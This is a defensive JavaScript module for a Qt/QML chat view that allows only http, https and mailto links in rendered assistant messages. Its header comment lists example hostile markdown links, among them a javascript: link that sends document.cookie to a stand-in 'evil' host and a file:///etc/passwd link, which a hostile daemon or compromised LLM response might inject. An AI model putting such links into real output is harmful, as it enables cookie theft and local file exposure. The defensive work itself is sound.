// LinkSafety.js — scheme allowlist for markdown links in ChatView.
//
// Background (#11, MEDIUM severity)
// ---------------------------------
// Assistant messages are rendered with `Text.MarkdownText`. The
// `onLinkActivated` handler used to call `Qt.openUrlExternally(link)`
// directly, with no validation. A hostile daemon — or a compromised
// LLM response — could therefore embed markdown like
//   [click](javascript:fetch('https://evil/'+document.cookie))
//   [seed](magnet:?xt=urn:btih:...)
//   [boom](file:///etc/passwd)
// and the URL would flow straight into the user's system URL handler.
//
// This module centralises the policy decision so it is:
//   • Allowlist-based (NOT a blacklist — unknown schemes are denied).
//   • Pure JS, unit-testable from qmltestrunner without instantiating
//     the full ChatView (which depends on Plasma QML modules that
//     aren't loadable from a generic test environment).
//   • Used identically by both plasmoid copies of ChatView.qml (the
//     `just chatview-sync` mirror keeps the files byte-identical).
//
// Public API
// ----------
//   isAllowedScheme(link) -> bool
//       True iff `link` is a string whose scheme is on the allowlist.
//       Case-insensitive on the scheme; null/undefined/no-scheme -> false.
//
//   openLinkSafely(link, opener)
//       If `isAllowedScheme(link)`, call `opener(link)`. Otherwise log
//       a warning and do nothing. Production callers pass
//       `Qt.openUrlExternally`; tests pass a recording stub.
//
.pragma library

// Allowlist of permitted URL schemes (lower-case, INCLUDING the trailing
// colon so a substring match cannot succeed on a partial prefix).
var ALLOWED_SCHEMES = ["http:", "https:", "mailto:"]

// Extract the scheme (including the trailing colon) from a URL-ish
// string and return it lower-cased, or null if no scheme is present.
//
// We intentionally do NOT use `new URL(link)` here: QML's QV4 engine
// supports it, but URL() is liberal in what it accepts (it will happily
// parse things that browsers treat as a valid URL with an unexpected
// scheme), and a manual scheme-extraction step is simpler to audit.
function _extractScheme(link) {
    if (link === null || link === undefined) {
        return null
    }
    var s = String(link)
    var colonIdx = s.indexOf(":")
    if (colonIdx <= 0) {
        // No colon, or leading colon (empty scheme).
        return null
    }
    // Scheme characters must be ASCII letters / digits / + - . per
    // RFC 3986 and must start with a letter. We don't enforce the full
    // grammar — we only need to make sure we don't mistake a
    // path-with-colon for a scheme. If anything non-scheme-ish appears
    // before the colon, treat it as no-scheme.
    for (var i = 0; i < colonIdx; ++i) {
        var c = s.charCodeAt(i)
        var isAlpha = (c >= 0x41 && c <= 0x5a) || (c >= 0x61 && c <= 0x7a)
        var isDigit = (c >= 0x30 && c <= 0x39)
        var isOther = (c === 0x2b /* + */ || c === 0x2d /* - */ || c === 0x2e /* . */)
        if (i === 0 && !isAlpha) {
            return null
        }
        if (!isAlpha && !isDigit && !isOther) {
            return null
        }
    }
    return s.substring(0, colonIdx + 1).toLowerCase()
}

function isAllowedScheme(link) {
    var scheme = _extractScheme(link)
    if (scheme === null) {
        return false
    }
    for (var i = 0; i < ALLOWED_SCHEMES.length; ++i) {
        if (ALLOWED_SCHEMES[i] === scheme) {
            return true
        }
    }
    return false
}

function openLinkSafely(link, opener) {
    if (!isAllowedScheme(link)) {
        var scheme = _extractScheme(link)
        console.warn("LinkSafety: blocked link with disallowed scheme:",
                     scheme === null ? "(none)" : scheme,
                     "url:", String(link))
        return
    }
    opener(link)
}
